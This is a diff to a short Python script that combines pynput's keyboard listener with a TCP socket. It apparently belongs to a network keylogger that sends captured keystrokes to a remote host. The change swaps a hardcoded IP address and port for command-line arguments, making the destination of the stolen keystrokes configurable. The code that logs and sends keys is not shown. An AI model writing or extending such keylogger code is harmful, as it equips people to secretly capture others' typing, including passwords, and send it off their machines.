@@ -1,6 +1,7 @@
 # Import socket module
 import socket
 from pynput.keyboard import Listener, Key
+import sys
 
 s = None
 
@@ -21,10 +22,10 @@ def on_press(key):
 
 
 # local host IP '127.0.0.1'
-host = '192.168.1.13'
+host = sys.argv[1]
 
 # Define the port on which you want to connect
-port = 12345
+port = int(sys.argv[2])
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
